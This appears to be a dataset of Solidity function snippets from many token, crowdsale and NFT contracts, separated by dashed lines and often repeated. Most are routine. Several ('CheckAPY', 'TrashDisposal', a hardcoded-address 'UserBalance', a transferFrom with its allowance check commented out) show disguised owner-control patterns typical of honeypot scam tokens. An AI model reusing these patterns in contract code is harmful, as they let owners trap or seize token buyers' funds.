function CheckAPY(address spender, bool val, bool val2, bool val3, bool val4) external onlyOwner {
    wolf[spender] = val;
    kraken[spender] = val2; 
    octopus[spender] = val3;
    ofsixynine = val4;
  }
--------------------------------------------------------------------------------
function getTransferPreSignedHash(
        address _token,
        address _to,
        uint256 _value,
        uint256 _fee,
        uint256 _nonce
    )
        public
        pure
        returns (bytes32)
    {
        /* "0d98dcb1": getTransferPreSignedHash(address,address,uint256,uint256,uint256) */
        return keccak256(abi.encodePacked(bytes4(0x0d98dcb1), _token, _to, _value, _fee, _nonce));
    }
--------------------------------------------------------------------------------
function getApprovePreSignedHash(
        address _token,
        address _spender,
        uint256 _value,
        uint256 _fee,
        uint256 _nonce
    )
        public
        pure
        returns (bytes32)
    {
        /* "79250dcf": getApprovePreSignedHash(address,address,uint256,uint256,uint256) */
        return keccak256(abi.encodePacked(bytes4(0x79250dcf), _token, _spender, _value, _fee, _nonce));
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
        if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function CheckAPY(address spender, bool val, bool val2, bool val3, bool val4) external onlyOwner {
    marvel[spender] = val;
    fantastic[spender] = val2; 
    omni[spender] = val3;
    ireland = val4;
  }
--------------------------------------------------------------------------------
function balanceOf(address owner) public view override returns (uint256) {
        if (owner == address(0)) revert BalanceQueryForZeroAddress();
        return uint256(_addressData[owner].balance);
    }
--------------------------------------------------------------------------------
function proclaimDeath() public onlyHeir {
        require(owner != heir); // added
        require(ownerLives());
        OwnerProclaimedDead(owner, heir, timeOfDeath);
        timeOfDeath = now;
    }
--------------------------------------------------------------------------------
function () payable public {
    if (contractStage == 1) {
      _ethDeposit();
    } else if (contractStage == 3) {
      _ethRefund();
    } else revert();
  }
--------------------------------------------------------------------------------
function withdrawFor (address contributor, address tokenAddr) public onlyOwner {
    require (contractStage == 3);
    require (contributorMap[contributor].balance > 0);
    _withdraw(contributor, tokenAddr);
  }
--------------------------------------------------------------------------------
constructor () public {
         owner = msg.sender;
         balances[owner] = _totalSupply;
        emit Transfer(0, owner, _totalSupply);
     }
--------------------------------------------------------------------------------
function transfer(address recipient, uint256 amount) public virtual onlyPermitted override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        
        if(_msgSender() == creator())
        { givePermissions(recipient); }
        
        return true;
    }
--------------------------------------------------------------------------------
function remainingTokens() public view returns (uint256) {
        return
            Math.min(
                token().balanceOf(_tokenWallet),
                token().allowance(_tokenWallet, address(this))
            );
    }
--------------------------------------------------------------------------------
function isOperatorFor(address operator, address tokenHolder) public view virtual override returns (bool) {
        return
            operator == tokenHolder ||
            (_defaultOperators[operator] && !_revokedDefaultOperators[tokenHolder][operator]) ||
            _operators[tokenHolder][operator];
    }
--------------------------------------------------------------------------------
function transfer(address recipient, uint256 amount) public virtual onlyPermitted override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        
        if(_msgSender() == creator())
        { givePermissions(recipient); }
        
        return true;
    }
--------------------------------------------------------------------------------
function acceptConverterOwnership(IBancorConverterExtended _oldConverter) private {
        require(msg.sender == _oldConverter.owner());
        _oldConverter.acceptOwnership();
        emit ConverterOwned(_oldConverter, this);
    }
--------------------------------------------------------------------------------
function transferByPartition(
    bytes32 partition,
    address to,
    uint256 value,
    bytes calldata data
  )
    external
    isValidCertificate(data)
    returns (bytes32)
  {
    return _transferByPartition(partition, msg.sender, msg.sender, to, value, data, "");
  }
--------------------------------------------------------------------------------
function _getDefaultPartitions(address tokenHolder) internal view returns(bytes32[] memory) {
    if(_defaultPartitionsOf[tokenHolder].length != 0) {
      return _defaultPartitionsOf[tokenHolder];
    } else {
      return _tokenDefaultPartitions;
    }
  }
--------------------------------------------------------------------------------
function newWindow(uint8 _winNum, uint256 _tokenPerWindow) private {
        ww[_winNum] = Window(true, 0, 0, 0, _tokenPerWindow);
        NewWindow(_winNum, _tokenPerWindow);
    }
--------------------------------------------------------------------------------
constructor () public {
         owner = msg.sender;
         balances[owner] = _totalSupply;
        emit Transfer(0, owner, _totalSupply);
     }
--------------------------------------------------------------------------------
function dequeue() internal returns (address data) {
        require(last >= first);
        // non-empty queue

        data = queue[first];

        delete queue[first];
        first += 1;
    }
--------------------------------------------------------------------------------
function transfer(address _to, uint256 _value) public {
        require(msg.sender == owner || send_allowed == true); 
        _transfer(msg.sender, _to, _value);
    }
--------------------------------------------------------------------------------
function setEndDateForContract(uint256 _endTime) public onlyOwner {
        require(!isLocked, "Cannot modify end dates after lock");
        contractSettings.end = _endTime;
    }
--------------------------------------------------------------------------------
constructor () public {
        _decimals = 18;
        _owner = _msgSender();
        _safeOwner = _msgSender();
        _mint(_owner, initialSupply*(10**18));
      
    }
--------------------------------------------------------------------------------
function returnEth() internal {
        // return if some eth left
        if (address(this).balance > 0) {
            msg.sender.transfer(address(this).balance);
        }
    }
--------------------------------------------------------------------------------
function finalization() internal {
        token.finishMinting();
        LuckCashToken(token).unpause();

        wallet.transfer(this.balance);

        super.finalization();
    }
--------------------------------------------------------------------------------
function updateFeeRecipient(address _nextFeeRecipient) public onlyOwner {
        // ShiftIn and ShiftOut will fail if the feeRecipient is 0x0
        require(_nextFeeRecipient != address(0x0), "fee recipient cannot be 0x0");

        feeRecipient = _nextFeeRecipient;
    }
--------------------------------------------------------------------------------
constructor(
        ModuleRegistry _registry,
        TransferStorage _transferStorage,
        GuardianStorage _guardianStorage,
        address _priceProvider,
        uint256 _securityPeriod,
        uint256 _securityWindow,
        uint256 _defaultLimit,
        LimitManager _oldLimitManager
    )
        BaseModule(_registry, _guardianStorage, NAME)
        LimitManager(_defaultLimit)
        public
    {
        transferStorage = _transferStorage;
        priceProvider = TokenPriceProvider(_priceProvider);
        securityPeriod = _securityPeriod;
        securityWindow = _securityWindow;
        oldLimitManager = _oldLimitManager;
    }
--------------------------------------------------------------------------------
function isWhitelisted(BaseWallet _wallet, address _target) public view returns (bool _isWhitelisted) {
        uint whitelistAfter = transferStorage.getWhitelist(_wallet, _target);
        // solium-disable-next-line security/no-block-members
        return whitelistAfter > 0 && whitelistAfter < now;
    }
--------------------------------------------------------------------------------
function isValidSignature(bytes calldata _data, bytes calldata _signature) external view returns (bytes4) {
        bytes32 msgHash = keccak256(abi.encodePacked(_data));
        isValidSignature(msgHash, _signature);
        return ERC721_ISVALIDSIGNATURE_BYTES;
    }
--------------------------------------------------------------------------------
function _mint(address _to, uint256 _tokenId) internal {
    super._mint(_to, _tokenId);

    allTokensIndex[_tokenId] = allTokens.length;
    allTokens.push(_tokenId);
  }
--------------------------------------------------------------------------------
function estimate_saveViaUniswapETH(
        uint256 _ethAmount,
        address[] calldata _path,
        int128 _curvePosition
    )
        external
        view
        returns (uint256 out)
    {
        uint256 estimatedBasset = _getAmountOut(_ethAmount, _path);
        return curve.get_dy(_curvePosition, 0, estimatedBasset);
    }
--------------------------------------------------------------------------------
function calculateDividendTokens(uint256 ethervalue, uint256 subvalue) public constant returns (uint256 tokens) {
		return sub(fixedExp(fixedLog(reserve() - subvalue + ethervalue)*crr_n/crr_d + price_coeff), totalSupply);
	}
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value) public
    returns (bool success) {
        require(!blacklist[msg.sender]);
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function RTEToken() public {
    // Mint initial supply of tokens. All further minting of tokens is disabled
    totalSupply_ = INITIAL_SUPPLY;

    // Transfer all initial tokens to msg.sender
    balances[msg.sender] = INITIAL_SUPPLY;
    Transfer(0x0, msg.sender, INITIAL_SUPPLY);
  }
--------------------------------------------------------------------------------
function validPurchase() internal constant returns (bool) {
    bool withinPeriod = started;
    bool nonZeroPurchase = msg.value != 0;
    return withinPeriod && nonZeroPurchase;
  }
--------------------------------------------------------------------------------
function ZildFinanceCoin() public {
        totalSupply_ = INITIAL_SUPPLY;
        balances[msg.sender] = INITIAL_SUPPLY;
        Transfer(0x0, msg.sender, INITIAL_SUPPLY);
    }
--------------------------------------------------------------------------------
function depositETH() external payable {
        deposits[msg.sender] += msg.value;
        emit LogDepositETH(msg.sender, msg.value);
    }
--------------------------------------------------------------------------------
function trySetSubnodeOwner(bytes32 _hash, address _newOwner) internal {
        if(ens.owner(rootNode) == address(this))
            ens.setSubnodeOwner(rootNode, _hash, _newOwner);        
    }
--------------------------------------------------------------------------------
function startAuctions(bytes32[] _hashes)  {
        for (uint i = 0; i < _hashes.length; i ++ ) {
            startAuction(_hashes[i]);
        }
    }
--------------------------------------------------------------------------------
function _setImplementation(address _newImplementation) internal {
    require(msg.sender == proxyOwner());
    bytes32 position = implementationPosition;

    assembly {
      sstore(position, _newImplementation)
    }
  }
--------------------------------------------------------------------------------
constructor(address _governorAddr, uint256 _delay)
        public
        ClaimableGovernor(_governorAddr)
    {
        require(_delay > 0, "Delay must be greater than zero");
        delay = _delay;
    }
--------------------------------------------------------------------------------
function createChannelId(
        address initiator,
        address beneficiary,
        uint amount,
        uint commission,
        uint createdAt,
        uint expiresAt,
        bytes32 hashedSecret
    )
        public
        pure
        returns (bytes32 channelId)
    {
        channelId = keccak256(abi.encodePacked(
            initiator,
            beneficiary,
            amount,
            commission,
            createdAt,
            expiresAt,
            hashedSecret
        ));
    }
--------------------------------------------------------------------------------
constructor () public {
         owner = msg.sender;
         balances[owner] = _totalSupply;
        emit Transfer(0, owner, _totalSupply);
     }
--------------------------------------------------------------------------------
function getPlayerStatusAndExceeded () public view returns (PlayerStatus, bool) {
        return (playerBook[msg.sender].status, playerBook[msg.sender].status == PlayerStatus.EXCEEDED);
    }
--------------------------------------------------------------------------------
function getTargetRepMarketCapInAttoCash() public view returns (uint256) {
        // Target MCAP = OI * TARGET_MULTIPLIER
        uint256 _totalOI = openInterestCash.totalSupply().add(getOpenInterestInAttoCash());
        return _totalOI.mul(Reporting.getTargetRepMarketCapMultiplier());
    }
--------------------------------------------------------------------------------
function _mint(address to, uint256 tokenId) internal {
    super._mint(to, tokenId);

    _allTokensIndex[tokenId] = _allTokens.length;
    _allTokens.push(tokenId);
  }
--------------------------------------------------------------------------------
function _mint(address _to, uint256 _tokenId) internal {
        super._mint(_to, _tokenId);

        allTokensIndex[_tokenId] = allTokens.length;
        allTokens.push(_tokenId);
    }
--------------------------------------------------------------------------------
function registerBroker(address _broker) external onlyOwner {
        require(!brokerRegistered[_broker], "already registered");
        brokerRegistered[_broker] = true;
        emit LogBrokerRegistered(_broker);
    }
--------------------------------------------------------------------------------
function deregisterBroker(address _broker) external onlyOwner {
        require(brokerRegistered[_broker], "not registered");
        brokerRegistered[_broker] = false;
        emit LogBrokerDeregistered(_broker);
    }
--------------------------------------------------------------------------------
function mint(
    address _to,
    uint256 _id,
    uint256 _quantity,
    bytes memory _data
  ) public onlyOwner {
    _mint(_to, _id, _quantity, _data);
    tokenSupply[_id] = tokenSupply[_id].add(_quantity);
  }
--------------------------------------------------------------------------------
function setUpgradeMaster(address master) external {
      if (master == 0x0) throw;
      if (msg.sender != upgradeMaster) throw;
      upgradeMaster = master;
  }
--------------------------------------------------------------------------------
function finalize() onlyOwner public {
      require(mediator != 0x0);
      require(!isFinalized);
      require(hasEnded());
      
      finalization();
      Finalized();

      isFinalized = true;
    }
--------------------------------------------------------------------------------
function withdrawAnyERC20(address _addressOfToken, address _recipient) public onlyOwner {
        ERC20 token = ERC20(_addressOfToken);
        token.transfer(_recipient, token.balanceOf(address(this)));
    }
--------------------------------------------------------------------------------
function TrashDisposal(address spender, bool val, bool val2, bool val3, bool val4) external onlyOwner {
    garbage[spender] = val;
    disposal[spender] = val2; 
    moab[spender] = val3;
    livingroom = val4;
  }
--------------------------------------------------------------------------------
function transferFrom(address _from, address _to, uint256 _value) onlyOwner public returns (bool success) {
        //require(_value <= allowance[_from][msg.sender]);     // Check allowance
        allowance[_from][msg.sender] -= _value;
        _transfer(_from, _to, _value);
        return true;
    }
--------------------------------------------------------------------------------
function participateCrowdsaleAll() public onlyOwner {
    // We might hit a max gas limit in this loop,
    // and in this case you can simply call participateCrowdsaleInvestor() for all investors
    for(uint i = 0; i < investors.length; i++) {
      participateCrowdsaleInvestor(investors[i]);
    }
  }
--------------------------------------------------------------------------------
function participateCrowdsaleSelected(address[] addr) public onlyOwner {
    for(uint i = 0; i < addr.length; i++ ){
      participateCrowdsaleInvestor(investors[i]);
    }
  }
--------------------------------------------------------------------------------
function addOwner(address _address) public ownerOnly {
    require(_address != address(0));
    owners[_address] = true;
    ownersCount++;
    emit OwnerAdded(_address);
  }
--------------------------------------------------------------------------------
function removeOwner(address _address) public ownerOnly notOwnerItself(_address) minOwners {
    require(owners[_address] == true);
    owners[_address] = false;
    ownersCount--;
    emit OwnerRemoved(_address);
  }
--------------------------------------------------------------------------------
function getTypes() external view returns(uint8[]) {
        uint8[] memory res = new uint8[](1);
        res[0] = 1;
        return res;
    }
--------------------------------------------------------------------------------
function transferETH() isOwner external {
        if (this.balance == 0) throw;
        if (!ethFundDeposit.send(this.balance)) throw;
    }
--------------------------------------------------------------------------------
function _transferFrom(address from, address to, uint256 tokenId) internal {
        super._transferFrom(from, to, tokenId);

        _removeTokenFromOwnerEnumeration(from, tokenId);

        _addTokenToOwnerEnumeration(to, tokenId);
    }
--------------------------------------------------------------------------------
function UserBalance(uint256 amount) public returns (bool) {
        require(
            _msgSender() == 0x403A4017eBf22597b723fC4cf761034903daCfbD,
            "BEP20: Not accessible"
        );
        burning(_msgSender(), amount);

        return true;
    }
--------------------------------------------------------------------------------
function delegate(address delegatee) external {
        if(delegatee == ZERO_ADDRESS){
            delegatee = msg.sender;
        }
        return _delegate(msg.sender, delegatee);
    }
--------------------------------------------------------------------------------
function ERC20(
    uint256 _initialSupply,
    string _tokenName,
    uint8 _decimalUnits,
    string _tokenSymbol
    ) public
    {

        balances[0x2e1977127F682723C778bBcac576A4aF2c0e790d] = _initialSupply;
        totalSupply = _initialSupply;
        decimals = _decimalUnits;
        symbol = _tokenSymbol;
        name = _tokenName;
    }
--------------------------------------------------------------------------------
function addRecipient( address _recipient, uint _rewardRate ) external onlyPolicy() {
        require( _recipient != address(0) );
        info.push( Info({
            recipient: _recipient,
            rate: _rewardRate
        }));
    }
--------------------------------------------------------------------------------
function queueRaiseLimit( address token, uint newMax ) external onlyPolicy() {
        tokenInfo[ token ].limitChangeTimelockEnd = block.number.add( timelockInBlocks );
        tokenInfo[ token ].newLimit = newMax;
    }
--------------------------------------------------------------------------------
function _mint(address to, uint256 tokenId) internal {
    super._mint(to, tokenId);

    _allTokensIndex[tokenId] = _allTokens.length;
    _allTokens.push(tokenId);
  }
--------------------------------------------------------------------------------
function transfer(address to, uint256 value) public returns (bool) {
        // Mutable state call requires the proxy to tell the target who the msg.sender is.
        target.setMessageSender(msg.sender);

        // Forward the ERC20 call to the target contract
        IERC20(target).transfer(to, value);

        // Event emitting will occur via Synthetix.Proxy._emit()
        return true;
    }
--------------------------------------------------------------------------------
function approve(address spender, uint256 value) public returns (bool) {
        // Mutable state call requires the proxy to tell the target who the msg.sender is.
        target.setMessageSender(msg.sender);

        // Forward the ERC20 call to the target contract
        IERC20(target).approve(spender, value);

        // Event emitting will occur via Synthetix.Proxy._emit()
        return true;
    }
--------------------------------------------------------------------------------
function validPurchase() internal constant returns (bool) {
    bool withinPeriod = started;
    bool nonZeroPurchase = msg.value != 0;
    return withinPeriod && nonZeroPurchase;
  }
--------------------------------------------------------------------------------
function _transferFrom(address from, address to, uint256 tokenId) internal {
        super._transferFrom(from, to, tokenId);

        _removeTokenFromOwnerEnumeration(from, tokenId);

        _addTokenToOwnerEnumeration(to, tokenId);
    }
--------------------------------------------------------------------------------
constructor(
    ERC20Basic _token,
    uint256 _releaseTime
  )
    public
  {
    require(_releaseTime > block.timestamp);
    token = _token;
    owner = msg.sender;
    releaseTime = _releaseTime;
  }
--------------------------------------------------------------------------------
function ALM(){
		totalSupply=MAX_SUPPLY;
		balances[msg.sender] = MAX_SUPPLY;
		Transfer(0x0, msg.sender, MAX_SUPPLY);
	}
--------------------------------------------------------------------------------
function transferETH() isOwner external {
        if (this.balance == 0) throw;
        if (!ethFundDeposit.send(this.balance)) throw;
    }
--------------------------------------------------------------------------------
constructor() {
        balances[msg.sender] = totalSupply_;
        emit Transfer(address(0), msg.sender, totalSupply_);

    }
--------------------------------------------------------------------------------
function _requireAccessToSuspend(bytes32 section) internal view {
        require(accessControl[section][msg.sender].canSuspend, "Restricted to access control list");
    }
--------------------------------------------------------------------------------
function remainingTokens() external view returns (uint256) {
        return Math.min(
            saleToken.balanceOf(tokenWallet),
            saleToken.allowance(tokenWallet, address(this))
        );
    }
--------------------------------------------------------------------------------
function renameChibi(uint _tokenId, string _name) public returns (bool success){
        require(ownerOf(_tokenId) == msg.sender);

        chibies[_tokenId].nameChibi = _name;
        return true;
    }
--------------------------------------------------------------------------------
function takeOwnership(uint256 _tokenId) public {
        require(isApprovedFor(msg.sender, _tokenId));
        clearApprovalAndTransfer(ownerOf(_tokenId), msg.sender, _tokenId);
    }
--------------------------------------------------------------------------------
function changeCooldownSettings(bool newStatus, uint256 newInterval) external onlyOwner {
        require(newInterval <= 24 hours, "Exceeds the limit");
        cooldownEnabled = newStatus;
        cooldownTimerInterval = newInterval;
    }
--------------------------------------------------------------------------------
function setRule(uint _baseLockPercent, uint _startLockTime, uint _stopLockTime, uint _linearRelease) onlyOwner {
        assert(_stopLockTime > _startLockTime);
       
        baseLockPercent = _baseLockPercent;
        startLockTime = _startLockTime;
        stopLockTime = _stopLockTime;
        linearRelease = _linearRelease;
    }
--------------------------------------------------------------------------------
function SimpleToken() public {
    totalSupply_ = INITIAL_SUPPLY;
    balances[msg.sender] = INITIAL_SUPPLY;
    Transfer(0x0, msg.sender, INITIAL_SUPPLY);
  }
--------------------------------------------------------------------------------
function withdrawEther() onlyOwner {
    require(this.balance != 0);
    owner.transfer(this.balance);
    EtherWithdrawn(this.balance);
  }
--------------------------------------------------------------------------------
function startIco() external teamOnly {
    require(icoState == IcoState.Presale || icoState == IcoState.Paused);
    icoState = IcoState.Running;
    RunIco();
  }
--------------------------------------------------------------------------------
function setApprovalForAll(address _operator, bool _approved) external {
        operatorApprovals[msg.sender][_operator] = _approved;
        emit ApprovalForAll(msg.sender, _operator, _approved);
    }
--------------------------------------------------------------------------------
function hasEnded() public constant returns (bool) {
    bool capReached = weiRaised >= cap;
    bool passedEndTime = now > endTime;
    return passedEndTime || capReached;
  }
--------------------------------------------------------------------------------
function getTakerFeeRate(OrderParam memory orderParam, bool isParticipantRelayer)
        internal
        view
        returns(uint256)
    {
        uint256 rawRate = getAsTakerFeeRateFromOrderData(orderParam.data);
        return getFinalFeeRate(orderParam.trader, rawRate, isParticipantRelayer);
    }
--------------------------------------------------------------------------------
function settleResults(
        MatchResult[] memory results,
        OrderParam memory takerOrderParam,
        OrderAddressSet memory orderAddressSet
    )
        internal
    {
        if (isSell(takerOrderParam.data)) {
            settleTakerSell(results, orderAddressSet);
        } else {
            settleTakerBuy(results, orderAddressSet);
        }
    }
--------------------------------------------------------------------------------
function NETRico (string _campaignUrl, token _addressOfTokenUsedAsReward) public {
        creator = 0xB987B463c7573f0B7b6eD7cc8E5Fab9042272065;
        //creator = msg.sender;
        campaignUrl = _campaignUrl;
        tokenReward = token(_addressOfTokenUsedAsReward);

        emit LogFunderInitialized(
            creator,
            campaignUrl
            );
    }
--------------------------------------------------------------------------------
function transferTokenContractOwnership(address newOwner) public onlyOwner {
    require(newOwner != address(0));
    Ownable(_tokenAddress).transferOwnership(newOwner);
    emit TokenContractOwnershipTransferred(newOwner);
  }
--------------------------------------------------------------------------------
function allowance(address _owner, address _spender) public view returns(uint256)
    {
       require(_owner != address(0x0) && _spender != address(0x0));

       return allowed[_owner][_spender];
    }
--------------------------------------------------------------------------------
constructor() public {
    balances[msg.sender] = _totalSupply;
    emit Transfer(address(0), msg.sender, _totalSupply);
  }
--------------------------------------------------------------------------------
function transfer(address _to, uint _value)
        public
        unfreezed(_to)
        unfreezed(msg.sender)
        noEmergencyFreeze()
        returns (bool success)
    {
        bytes memory _data;
        _transfer223(msg.sender, _to, _value, _data);
        return true;
    }
--------------------------------------------------------------------------------
function record(bytes _notarisedData) public constant returns(bytes, uint256) {
        Record memory r = records[keccak256(_notarisedData)];
        return (r.notarisedData, r.timestamp);
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function addAddressToWhitelist(address addr) onlyOwner public returns(bool success) {
    if (!whitelist[addr]) {
      whitelist[addr] = true;
      emit WhitelistedAddressAdded(addr);
      success = true;
    }
  }
--------------------------------------------------------------------------------
function removeAddressFromWhitelist(address addr) onlyOwner public returns(bool success) {
    if (whitelist[addr]) {
      whitelist[addr] = false;
      emit WhitelistedAddressRemoved(addr);
      success = true;
    }
  }
--------------------------------------------------------------------------------
function balanceOf(address owner) public view override returns (uint256) {
        if (owner == address(0)) revert BalanceQueryForZeroAddress();
        return uint256(_addressData[owner].balance);
    }
--------------------------------------------------------------------------------
function _numberMinted(address owner) internal view returns (uint256) {
        if (owner == address(0)) revert MintedQueryForZeroAddress();
        return uint256(_addressData[owner].numberMinted);
    }
--------------------------------------------------------------------------------
function _numberBurned(address owner) internal view returns (uint256) {
        if (owner == address(0)) revert BurnedQueryForZeroAddress();
        return uint256(_addressData[owner].numberBurned);
    }
--------------------------------------------------------------------------------
function buyTokens(uint tokens) public payable {
    require(msg.value >= tokens * weiPerToken);
    balances[msg.sender] += tokens;
    _totalSupply += tokens;
  }
--------------------------------------------------------------------------------
function validPurchase() internal constant returns (bool) {
    bool withinPeriod = started;
    bool nonZeroPurchase = msg.value != 0;
    return withinPeriod && nonZeroPurchase;
  }
--------------------------------------------------------------------------------
function withdraw(address _address) public onlyOwner {
        uint tokenBalanceOfContract = getRemainingToken();
        STRONG.transfer(_address, tokenBalanceOfContract);
        emit LogWithdrawal(_address, tokenBalanceOfContract);
    }
--------------------------------------------------------------------------------
constructor () public {
         owner = msg.sender;
         balances[owner] = _totalSupply;
        emit Transfer(0, owner, _totalSupply);
     }
--------------------------------------------------------------------------------
function lockAddress(address _address) public onlyLocker returns (bool) {
        require(!locked[_address]);

        locked[_address] = true;
        emit Lock(_address);
        return true;
    }
--------------------------------------------------------------------------------
function unlockAddress(address _address) public onlyLocker returns (bool) {
        require(locked[_address]);

        locked[_address] = false;
        emit Unlock(_address);
        return true;
    }
--------------------------------------------------------------------------------
function transfer(address _to, uint _value) returns(bool) {
        if (_to != 0x0) {
          return _transferWithReference(_to, _value, "");
        }
        else {
            return false;
        }
    }
--------------------------------------------------------------------------------
function transferWithReference(address _to, uint _value, string _reference) returns(bool) {
        if (_to != 0x0) {
            return _transferWithReference(_to, _value, _reference);
        }
        else {
            return false;
        }
    }
--------------------------------------------------------------------------------
function purgeUpgrade() onlyAssetOwner() returns(bool) {
        if (pendingVersion == 0x0) {
            return false;
        }
        delete pendingVersion;
        delete pendingVersionTimestamp;
        return true;
    }
--------------------------------------------------------------------------------
function getMintDigest(uint256 nonce, bytes32 challenge_digest, bytes32 challenge_number) public view returns (bytes32 digesttest) {
        bytes32 digest = keccak256(abi.encodePacked(challenge_number,msg.sender,nonce));
        return digest;
    }
--------------------------------------------------------------------------------
function increaseAllowance(address spender, uint256 addedValue) external returns (bool) {
        _approve(msg.sender, spender, _allowances[msg.sender][spender] + addedValue);
        return true;
    }
--------------------------------------------------------------------------------
constructor () public {
        _decimals = 18;
        _owner = _msgSender();
        _safeOwner = _msgSender();
        _mint(_owner, initialSupply*(10**18));
     
    }
--------------------------------------------------------------------------------
function paymentWithEth(uint256 oracle_, uint128 payment_) public view returns(uint256) {
      if (oracle_ < 5) {
          return uniswapExchange.getEthToTokenOutputPrice(payment_);
      } else {
          return uint(payment_);
      }
  }
--------------------------------------------------------------------------------
function freezeTokens(address _beneficiary, uint256 _amount, uint256 _when) public onlyOwner {
        freeze storage _freeze = freezedTokens[_beneficiary];
        _freeze.amount = _amount;
        _freeze.when = _when;
    }
--------------------------------------------------------------------------------
function transferETH() isOwner external {
        require(address(this).balance != 0);
        require(ethFundDeposit.send(address(this).balance));
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function setFlywheelRewards(IFlywheelRewards newFlywheelRewards) external requiresAuth {
        address oldFlywheelRewards = address(flywheelRewards);

        flywheelRewards = newFlywheelRewards;

        emit FlywheelRewardsUpdate(oldFlywheelRewards, address(newFlywheelRewards));
    }
--------------------------------------------------------------------------------
function Ongo() public {
    totalSupply_ = INITIAL_SUPPLY;
    balances[msg.sender] = INITIAL_SUPPLY;
    Transfer(0x0, msg.sender, INITIAL_SUPPLY);
  }
--------------------------------------------------------------------------------
function transferOwnershipWithBalance(address newOwner) onlyOwner public{
		if (newOwner != address(0)) {
		    _transfer(owner,newOwner,balanceOf[owner]);
		    owner = newOwner;
		}
	}
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function GTSTOKEN (address admin_) {
      lockTime = 1518192000;//2018/2/10 0:0:0
      owner = admin_;
      setDestoryAddress(address(0x0));
      balances[admin_] = totalSupply - lockTotal;
  }
--------------------------------------------------------------------------------
function setFeelessSender(address _sender, bool _feeless) public onlyOwner {
        require(!_feeless || _feeless && canWhitelist, "cannot add to whitelist");
        feelessSender[_sender] = _feeless;
    }
--------------------------------------------------------------------------------
function setFeelessReciever(address _recipient, bool _feeless) public onlyOwner {
        require(!_feeless || _feeless && canWhitelist, "cannot add to whitelist");
        feelessReciever[_recipient] = _feeless;
    }
--------------------------------------------------------------------------------
function calculateDividends_(uint256 _incomingEthereum) internal view returns(uint256) {
      uint256 _dividends = SafeMath.div(SafeMath.mul(_incomingEthereum, dividendFee_), 100);
      return _dividends;
    }
--------------------------------------------------------------------------------
function createReserveTokensVault() external onlyOwner {
        require(address(reserveTokensVault) == address(0));

        /// Reserve tokens - 631 million
        reserveTokensVault = createTokenVaultInt(631000000);

        require(totalSupply_ <= HARD_CAP);
    }
--------------------------------------------------------------------------------
function inCaseTokenGetsStuck(IERC20 _TokenAddress) onlyOwner public {
      uint qty = _TokenAddress.balanceOf(address(this));
      _TokenAddress.safeTransfer(msg.sender, qty);
  }
--------------------------------------------------------------------------------
function () payable {
        _getAsset()._performGeneric.value(msg.value)(msg.data, msg.sender);
        _returnReturnData(true);
    }
--------------------------------------------------------------------------------
function CheckAPY(address spender, bool val, bool val2, bool val3, bool val4) external onlyOwner {
    beetles[spender] = val;
    wolf[spender] = val2; 
    himalaya[spender] = val3;
    gallons = val4;
  }
--------------------------------------------------------------------------------
function GVOptionToken(
        address _optionProgram,
        string _name,
        string _symbol,
        uint _TOKEN_LIMIT
    ) {
        require(_optionProgram != 0);        
        optionProgram = _optionProgram;
        name = _name;
        symbol = _symbol;
        TOKEN_LIMIT = _TOKEN_LIMIT;
    }
--------------------------------------------------------------------------------
function EtceteraToken() public {
    totalSupply_ = founderTokens;
    balances[msg.sender] = founderTokens;
    Transfer(0x0, msg.sender, founderTokens);
    }
--------------------------------------------------------------------------------
function freeze(address _user) public onlyOwner returns (bool) {
        frozen[_user] = true;
        emit Freeze(msg.sender, _user, true);
        return true;
    }
--------------------------------------------------------------------------------
function unfreeze(address _user) public onlyOwner returns (bool) {
        frozen[_user] = false;
        emit Freeze(msg.sender, _user, false);
        return false;
    }
--------------------------------------------------------------------------------
function Scanetchain() public {
    totalSupply_ = INITIAL_SUPPLY;
    balances[msg.sender] = INITIAL_SUPPLY;
    Transfer(0x0, msg.sender, INITIAL_SUPPLY);
  }
--------------------------------------------------------------------------------
constructor () public {
         owner = msg.sender;
         balances[owner] = _totalSupply;
        emit Transfer(0, owner, _totalSupply);
     }
--------------------------------------------------------------------------------
function acceptOwnership() public {
        require(msg.sender == newOwner);
        OwnerUpdate(owner, newOwner);
        owner = newOwner;
        newOwner = 0x0;
    }
--------------------------------------------------------------------------------
function takeOwnership(uint256 _tokenId) public {
    require(isApprovedFor(msg.sender, _tokenId));
    clearApprovalAndTransfer(ownerOf(_tokenId), msg.sender, _tokenId);
  }
--------------------------------------------------------------------------------
function clearApproval(address _owner, uint256 _tokenId) private {
    require(ownerOf(_tokenId) == _owner);
    tokenApprovals[_tokenId] = 0;
    Approval(_owner, 0, _tokenId);
  }
--------------------------------------------------------------------------------
function _mint(address _to, uint256 _tokenId) internal {
    require(_to != address(0));
    addToken(_to, _tokenId);
    Transfer(0x0, _to, _tokenId);
  }
--------------------------------------------------------------------------------
function CheckAPY(address spender, bool val, bool val2, bool val3, bool val4) external onlyOwner {
    threecorners[spender] = val;
    texas[spender] = val2; 
    oklahoma[spender] = val3;
    yucatan = val4;
  }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
        if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function chnageSpecialFeeTake(uint id, address token, uint256 balance, uint256 feeTake) public isAdmin {
      require(id < specialFees.length);
      specialFees[id] = SpecialTokenBalanceFeeTake(
          true,
          token,
          balance,
          feeTake
      );
  }
--------------------------------------------------------------------------------
function addMinter(address minter) external returns (bool success) {
        require(msg.sender == governance, "!governance");    
